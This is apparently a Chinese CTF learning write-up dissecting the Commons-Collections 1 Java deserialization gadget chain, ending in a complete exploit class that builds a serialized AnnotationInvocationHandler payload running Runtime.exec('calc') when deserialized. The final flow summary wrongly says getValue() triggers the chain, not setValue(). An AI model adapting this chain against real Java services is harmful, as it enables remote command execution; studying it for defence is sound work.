---
title: Java反序列化-CC1链
date: 2026-03-09
category: web
tags: ["web", "ctf", "Java反序列化"]
excerpt: 这里是...地狱啊...
---

# Java反序列化-CC1链

## 0x01 写在前面

看了一晚上视频教程和博客感觉还是一知半解，花了一天时间重新梳理一下链子，Java反序列化真的很磨人(哭)，虽然难但确实受益匪浅

## 0x02 环境搭建

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- [Maven 3.6.3](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1)

网上已经有很多教程了，可以参考[Drun1baby师傅的文章](https://drun1baby.top/2022/06/06/Java反序列化Commons-Collections篇01-CC1链/)

## 00x3 攻击思路

一般来说，攻击是从尾部寻找危险方法出发去寻找头能进行序列化的对象，首先寻找危险方法，然后重复寻找调用前一个方法的其他类的方法，知道该方法能够被可序列化类调用的`readObject()`进行调用

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDFiYjFiYmQ5OWVhMDMyY2I2NmQ0ODg1NzI4Y2NhYzJfSHFmN3IwVHRGNWF5RGYwUElyQ0hJVUZ2ZDdCMHZtTnlfVG9rZW46T2dRY2JORnoxb3NTQW14Y2RUa2NwYktMbnRnXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

## 0x04 CC1链挖掘

### 1.寻找命令执行类方法

直接来看`Transformer`接口，内部有抽象方法`transform()`

```Java
public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);

}
```

在`Transformer`接口`ctrl + alt + B`查看实现接口的类

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5NjJlODEwNTg4MzM3OWYwODFlMGVkOTgxMzk0YjJfbHF0clNJV0VaRVdKZ25SbDc1clRvQWVWYjhXcjFBUjVfVG9rZW46UFVJWGIxSXlLb24yaDd4ZkdXRmM3Nlg1bjhmXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

查看实现类`InvokerTransformer` 具体的`transform()`方法

```Java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
            
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

可以发现实际上在`transform()`方法中完成了

- `Class cls = input.getClass();`获取目标对象的 Class
- `Method method = cls.getMethod(iMethodName, iParamTypes);`查找方法（反射）
- `return method.invoke(input, iArgs);`调用方法

并且我们能自己控制`iMethodName` `iParamTypes` `iArgs`的值，实现任意方法调用

```Java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
}
```

### Demo1

我们尝试调用`InvokerTransformer`类中的`transform()`方法实现计算器弹出

```JavaScript
Runtime r = Runtime.getRuntime();
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```

### 2.寻找调用transform()方法类

按照反序列化流程接下来就该找同样调用`transform()`的地方，我们`右键+Find Usages`查找

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDQ2Y2FhNjFkZDVmMWZmNzllZTFkMjViNGM2NjI4MzZfZFNLY0NIMGdVWlQwVGFIN3JVdm42ZWhpclFvWGg5a1BfVG9rZW46VmxGcGJCTWhVb2tHTUF4Uk9NNGM3RGE1bnVlXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

在`TransformedMap`类中的`checkSetValue()`方法中`valueTransformer`调用了`transform()`方法

```Java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

那就来看看`valueTransformer`是什么

```Java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

`valueTransformer`是`TransformedMap`类的一个字段，该类受`protected`修饰，因此我们无法通过直接`new`对象方式更改`valueTransformer`值。继续寻找关于`TransformedMap`的地方，在`decorate()`静态方法中，返回了一个`TransformedMap`，所以我们可以通过`TransformedMap.decorate()`以获取`TransformedMap`类

```Java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

以下代码先创建了一个`InvokerTransformer`对象，通过`TransformedMap.decorate()`方法将其`invokerTransformer`赋值为`invokerTransformer`，这样在调用`checkSetValue()`方法时就能触发`invokerTransformer.transform()`

```Java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap();
TransformedMap.decorate(map,null,invokerTransformer);
```

### Demo2

尝试利用反射`checkSetValue()` 完成命令执行

```Java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap map = new HashMap();
Map transformedMap =  TransformedMap.decorate(map,null,invokerTransformer);
Class TransformedMapClass = TransformedMap.class;
Method checkSetValueMethod =  TransformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
checkSetValueMethod.setAccessible(true);
checkSetValueMethod.invoke(transformedMap,r);
```

掌握以上内容这个Demo理解起来就不算难

### 3.寻找调用checkSetValue()方法类

接下来就考虑如何调用`checkSetValue()`方法了，**find Usages**发现只有一处对其进行了调用，`AbstractInputCheckedMapDecorator`的内部类`MapEntry`的`setValue()`方法中，类属性`parent`对其进行了调用

```Java
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

并且这个`AbstractInputCheckedMapDecorator`实际上是`TransformedMap` 的父类

```Java
public class TransformedMap
        extends AbstractInputCheckedMapDecorator
        implements Serializable {
            ······
            }
```

### Demo3

#### Demo代码

以下代码能成功执行命令

```Java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap();
map.put("key","value");
Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

for(Map.Entry entry: transformedMap.entrySet()){
    entry.setValue(r);
}
```

#### 原因分析

- `for(Map.Entry entry: transformedMap.entrySet())`取出`transformedMap` 中的键值对
- `entry.setValue(r)`

由于`TransformedMap` 继承了`AbstractInputCheckedMapDecorator`，但是`TransformedMap` 本身没有`setValue()`这个方法，于是就会调用父类的方法

而`AbstractInputCheckedMapDecorator`类重写了`setValue()`方法，所以实际上执行的是

```Java
public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
```

在这个方法中`parent`实际上就是我们创建的`TransformedMap`实例`transformedMap`

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUyM2U1ZWRhZWI0YmM0YmNmOWEyMzVlZGM1ODlkMDhfdXhOMUFKMTVqRDkzeDFsZmtaUjVvZjEzZ29HSThHazJfVG9rZW46T0xuemJlejFob2Nub2Z4OHhCbGNveHJabllkXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

因此在**value = parent.checkSetValue(value);**这一行中调用的是`TransformedMap`类中的`checkSetValue()`方法，达成了我们的目的

#### 难点理解

**为什么MapEntry.parent的值为transformedMap**

这个问题消耗了我一晚上时间思考，看的博客和视频都是一笔带过，个人感觉也是这条链子的难点(并非重点，拿出来详细讲讲，嫌麻烦的可以跳过该部分了

在我们Demo的`for(Map.Entry entry: transformedMap.entrySet())`该行打上断点调试

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY5ZDY3Njc1MDMxMDI5NjA0NGU5OWZlOTllZDRmZmRfTzhlemxIeHRrUVVaemZET09yRHl1V3BQTHF2czkxRnVfVG9rZW46RHVPamJJMVFMbzEzelF4aEYydWNVZm1IbnpiXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

单步进入来到`TransformedMap`的父类`AbstractInputCheckedMapDecorator` 的`entrySet()`方法，

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTcxYzYzMmEyZDBkZWQzZjc0NGZjMzIzNTFkYzJkYzJfVlJOdlZ5WlVkcTBISThTd09hTEd0UmczalpQWTVQZkNfVG9rZW46QmU1TmJWTVJub1k1Q1N4enRpQWNLS3hsbmlnXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

继续跟进来到`TransformedMap.isSetValueChecking()`,判断`valueTransformer`的值存在则返回true，显然poc中该值存在，返回true，进入`entrySet()`的if代码块`return new EntrySet(map.entrySet(), this);`

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NGY4ODZjZDEwY2Q0Yzg1ZTZmZWY3MTFhOTJhYjQ5ZDRfZ2djTEc4dFY1bkJvRFFxRmhmMlJLeFZHWG5Tanlldk9fVG9rZW46TXdQN2JnWTI2b3Fnbnh4eThJWWNWMVNyblJjXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

```Java
protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {
    super(set);
    this.parent = parent;
}
```

也就是执行了

```
return new EntrySet(map.entrySet(),transformedMap);
```

此时`EntrySe`t的`parent`值被设为`transformedMap`

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDRhNjkyZjg2N2IyNmEzZDZhZDFhMmYxMjYwMmZjNGVfaGlDamFIaEdxdmVaY0lhTGRPRjlOSGtuMWJZVHA0MDFfVG9rZW46S0lWTGJtQjhSb1lmMTB4RWpsdGNKMFFGblBkXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

然后返回到我们的poc

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQ4ZDdhMjM1NTA1NzE0OTA4ODdmM2ZmNTg3YzY1ZmFfZGVhaEZ6VkdjblVmTTdjWVN3dUF1dUtpdE1NaG52cjJfVG9rZW46SVVDcWJEcUphb3R3SGt4cm1SRWNRRlV2bndiXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

继续跟进到`next()`方法，返回一个**`MapEntry`****对象**

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NzEzMTQ4Mzg0Y2YzNWNhYTRiODM5OTNiNWE2ODFlZjZfRmdubnEySXVvNkN3a2U4dVNsRlJydkJxZzRTNzdHeUdfVG9rZW46RG9ndWI5amIyb01RVjJ4bldISGNOZ1hwbnJlXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

进入`MapEntry`构造方法

- `super(entry)` 调用父类构造函数，将 entry{"key"->"value"} 赋值给父类的 entry 字段
- `this.parent = parent` 将这个内部类的`parent`字段设为`transformedMap`

**在此时MapEntry.parent的值才真正被设为transformedMap**（感觉可以单独水一篇了呵呵

按照流程接下来寻找调用`setValue()`的非同名类的`readObject()`入口，那就继续find Usages呗

找到了`AnnotationInvocationHandler`类

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MTJlMmU2ZWQxNGY1YTNjN2UyNjY3NTIxOTEwZDA3MDRfT3pkeDZXaG5OU3B1SDJLWDV6WlN5b0JHeGdwVEpyQnFfVG9rZW46UVVncmI1eVBHb2tiS0h4V2RWSmNNQ0dvbkdjXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

可能有师傅没找到这个类，这里我也给出解决方案

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=Njc5NDZkNmQ4MTA0NDkwYjAyNDliMTA0NzM5NWFhOGNfREdYSXFqeGhvZzRWT2ZVenpYQnVkdERqMjhlV3NsUGtfVG9rZW46V0JNaGIxTFoxb3R2YTB4Q2lKTmNFS1hGbmhoXzE3NzI5OTY2MzE6MTc3MzAwMDIzMV9WNA)

该类的readObject()方法中调用了`setValue()`这么完美符合要求真的不是故意设计的吗

查看该类的构造方法需提供两个参数，第二个是注解类型的参数`type`，第二个是Map类型的参数`memberValues` ，赋值给类属性

```TypeScript
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    Class<?>[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    this.type = type;
    this.memberValues = memberValues;
}
```

满足两个条件触发`memberValues` 的`setValue()`，那么很清晰的就可以把前面构造的`transformedMap` 作为`memberValues` 参数

```TypeScript
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        //满足条件一
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            //满足条件二
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}
```

需要注意的是`AnnotationInvocationHandler`类并没有**访问修饰符**，属于**包级私有，**我们需要通过反射创建实例

```Java
//创建TransformedMap对象
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
HashMap<Object,Object> map = new HashMap();
map.put("key","value");
Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

//创建实例
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor annotationInvocationHandlerConstructor =  c.getConstructor(Class.class,Map.class);
annotationInvocationHandlerConstructor.setAccessible(true);
Object obj =  annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);

//序列化与反序列化
serialize(obj);
unserialize("ser.bin");
```

但是以上代码不能够真正实现**序列化****与反序列化**

- Runtime类没有继承Serializable接口，这意味着无法对其进行序列化
- 想要调用`setValue()`必须满足两个if要求
- AnnotationInvocationHandler.readObject()中`setValue()`的参数并不是Runtime对象

下面我们来逐个解决

## 0x05 问题解决

#### 问题一

**"Runtime类没有****继承****Serializable接口****，这意味着无法对其进行****序列化****"**

虽然Runtime类没有继承Serializable接口，但是Runtime.class是Class类，Class类继承了Serializable接口，我们可以通过反射机制动态获取并调用 Runtime 对象

```Java
Class c = Runtime.class;
Method getRuntimeMethod = c.getMethod("getRuntime",null);
Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);
Method execMethod = c.getMethod("exec", String.class);
execMethod.invoke(r,"calc");
```

参照上面的代码，我们通过`InvokerTransformer().transform()` 获取一步步所需对象

```JavaScript
Class c = Runtime.class;
//获取getRuntimeMethod方法
Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(c);
//获取Runtime对象
Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
//通过Runtime.exec执行命令
new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```

发现每一次`transfrom()` 的参数都是前一个获取到的对象

使用 `ChainedTransformer.transform()`递归调用减少这种复用的工作量

```TypeScript
/**
 * Constructor that performs no validation.
 * Use <code>getInstance</code> if you want that.
 * 
 * @param transformers  the transformers to chain, not copied, no nulls
 */
 //传参为Transformer类型数组
public ChainedTransformer(Transformer[] transformers) {
    super();
    iTransformers = transformers;
}

/**
 * Transforms the input to result via each decorated transformer
 * 
 * @param object  the input object passed to the first transformer
 * @return the transformed result
 */
 //递归调用，把前一个获取到的对象作为下一次循环的参数
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

`ChainedTransformer.transform()` 的利用

```JavaScript
Transformer[] transformers = new Transformer[]{
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
```

第一个问题就解决了

#### 问题二

**"想要调用****`setValue()`****必须满足两个if要求"**

我们拿到刚才ChainedTransformer构造新的poc

```JavaScript
Transformer[] transformers = new Transformer[]{
        new InvokerTransformer("getMethod"
                , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke"
                , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> hashMap = new HashMap<>();
hashMap.put("G3n","g4r");
Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
aihConstructor.setAccessible(true);
Object o = aihConstructor.newInstance(Override.class, transformedMap);


serialize(o);
unserialize("ser.bin");
```

直接运行还是不无法进行序列化操作，我们在两个个if条件判断打上断点进行调试

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzN2RjZTcyZjAyOThmNzJmYmUzNTYzMmVjMTRiNTFfbFpnanZIcDBvVXpseW5WVmxzUjcxUXMxcDBxWkpkMGZfVG9rZW46RXgwUWJja0NUbzNBS1p4QXpXYWNubUxDbmZkXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

调试面板中`memberType=null`跳出了第一个if判断

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDNjNzIwNjNhZTVhMTg2ODYxODkyYTA3MjJkMzEyMDdfeGJRYkFrYW9saFhsQ1dyeEpzQnhZYWg1N0NPZ1NVNUVfVG9rZW46UzNCd2JhMzJmb0FVS0x4Uk94ZmNidzRXbmpmXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

把断点打高看看`memberType`值是怎么被操作的

- 在434行`annotationType`获取到第一个参数`Override.class`的包含成员信息的元数据描述对象
- 在440行`memberTypes`获取实例成员的类型
- 在444行取出`memberTypes` 的键值对赋值给`memberValue`
- 在447行`name`获取`memberValue` 的键名
- 在446行`memberTypes`通过查找`memberTypes` 的name获取

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDc1ZWMxNTVjZDJlOWM0NDZmOWNmYzEyMjExNDc3ZjJfa3VYNEl5MWZzTXk4dGlWRmNiemJjOWxMcmt6cGF5MkdfVG9rZW46RGdMcmJlYWRob2t0aDl4NURBNGN6d1A1bjljXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

由于在`Override`中没有定义任何方法，则`memberTypes` 是一个空的 `Map`，所以`memberTypes.get("anything")`实际上是`null`

```Java
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.SOURCE)
public @interface Override {
}
```

那么我们就需要向`aihConstructor.newInstance()`传递有成员属性的注释类型的class，我们选择传递`Target.class`，在`Target`中有一个成员属性`value()`

```Java
public @interface Target {
    /**
     * Returns an array of the kinds of elements an annotation type
     * can be applied to.
     * @return an array of the kinds of elements an annotation type
     * can be applied to
     */
    ElementType[] value();
}
```

但是此时仍然`memberType=null`，还是没能进入if代码块

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MmVmMDQ2OGYxNzI2ZjU2NDRjY2Q2ZmMzMDlhYTkwYmJfRFhEVVBMdXNEMHVIVEp1V2hhbU5VWFpZc0RUeTdZN2VfVG9rZW46VFkwQmJveDRob0tVMGJ4YjM3amNoNTB2bmZiXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

这是因为执行`Class<?> memberType = memberTypes.get(name)`时，没有找到名为"G3n"的成员属性，因此我们需要将poc中`hashMap.put()`传递的键名改为`memberTypes`拥有的成员属性（即value），就能成功满足第一个if条件判断

第二个if判断`value`是否属于`memberType`表示的类，这里能够直接进入就不过多赘述了

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MWNhZGQ0ZGMwYzMxMmZhZjU2ZjI4NTgzMmYxY2FlZjdfZ1pKNXpSNGtWcVpjWllkTEJLY0wyZ0Yxd2lxejJlR1dfVG9rZW46UWEwdmJRb0JZb0dHVzh4QWVKR2M5Ujd5bmFoXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

#### 问题三

**"AnnotationInvocationHandler.readObject()中****`setValue()`****的参数并不是Runtime对象"**

```Java
memberValue.setValue(
    new AnnotationTypeMismatchExceptionProxy(
        value.getClass() + "[" + value + "]").setMember(
            annotationType.members().get(name)));
```

但是我们要控制`setValue()`参数为**Runtime对象**才能触发InvokerTransformer.transform(runtime)实现命令执行

该怎么做，在最开始"在`Transformer`接口`ctrl + alt + B`查看实现接口的类"的时候有一个特殊的类——`ConstantTransformer`

在这个类的构造方法中，`iConstant` 属性的值为传入的任何对象

在这个类的`transform()`方法中，无论传递什么参数，最终都会返回类属性`iConstant` 

```Java
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}

public Object transform(Object input) {
    return iConstant;
}
```

因此我们可以把`new ConstantTransformer(Runtime.class)`作为第一个`transformers`数组的第一个元素，在触发`ChainedTransformer.transform()`时，先执行`ConstantTransformer(Runtime.class).transform("g4r")`，且忽略输入 "g4r"，直接返回`Runtime.class`并作为下一个元素调用`transform()`方法的参数

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NTkxYzlkN2EwZjk3ZDUzYzkxZDhkYWY1OWUxNmMyMzJfRFVIRndvYW9TSk0zY0NyZkpxdzVRRDg0eFNwaE0ydklfVG9rZW46SWMwSmJXN01ib1pTTUJ4T0JDbGNOS3VYbjNhXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

那么三个问题都得到了解决这条链子也算正式打通了

## 0x06 完整EXP

```Java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.NoSuchMethodException;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {

    public static void main(String[] args) throws IOException, NoSuchMethodException, IllegalAccessException, java.lang.reflect.InvocationTargetException, ClassNotFoundException, InstantiationException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","g4r");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInput ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

## 0x07 回顾利用链

```Java
利用链：
InvokerTransformer#transform
    TransformedMap#checkSetValue
        AbstractInputCheckedMapDecorator#setValue
            AnnotationInvocationHandler#readObject
使用到的工具类辅助利用链：
ConstantTransformer
ChainedTransformer
HashMap
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE2ZDg2MGQ5ZjNjZGE5ZDczN2U5OWI4M2QwZWM4OTJfUFFaSFI4UmRBbzROSWNCbFZpWEJEQ1RDR25PUlpFcGlfVG9rZW46T284b2J5bXhab3JMM3p4Y1N0NWNpTFFXbjhlXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

## 0x08 反序列化分析

最后来梳理一下反序列化过程

```Java
ObjectInputStream.readObject()  // unserialize("ser.bin")
    ↓
sun.reflect.annotation.AnnotationInvocationHandler.readObject()
    ↓
遍历 transformedMap.entrySet()   // transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer)
    ↓
entry.getKey() → "value"         //  hashMap.put("value", "g4r")
entry.getValue() → 触发 TransformedMap.MapEntry.getValue()
    ↓
TransformedMap.MapEntry.getValue() 调用:
valueTransformer.transform("g4r")   // valueTransformer = chainedTransformer
    ↓
chainedTransformer.transform("g4r")     // ChainedTransformer(transformers)
    ↓
transformers[0].transform("g4r")        // ConstantTransformer(Runtime.class)
        → 返回 Runtime.class
    ↓
transformers[1].transform(Runtime.class) // InvokerTransformer("getMethod", {"getRuntime", null})
        → 返回 Method: Runtime.getRuntime
    ↓
transformers[2].transform(getRuntimeMethod) // InvokerTransformer("invoke", {null, null})
        → 返回 Runtime 实例: Runtime.getRuntime()
    ↓
transformers[3].transform(runtimeInstance) // InvokerTransformer("exec", {"calc"})
        → 执行 runtime.exec("calc")
    ↓
Windows计算器弹出
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ODkxMmZiYWE1OTIwNmJjNTYxMThmMDlkOWIwMTU5OTBfME45VmRPVVlxSGxXc2M0QWhsN2hGRGE0WmpDNEhZN2lfVG9rZW46VW5aYWJYbGpEb3B0OFl4Q0lpbmNSSTNpblVlXzE3NzI5OTY2MzI6MTc3MzAwMDIzMl9WNA)

## 0x09 写在后面

强烈推荐自己动手挖链子调试，思路会清晰很多，感觉代码审计能力都提高了哈哈，之前一直不会调试


CC链和DNSURL链简直不是一个难度，真的需要静下心来，于我而言也是莫大的挑战
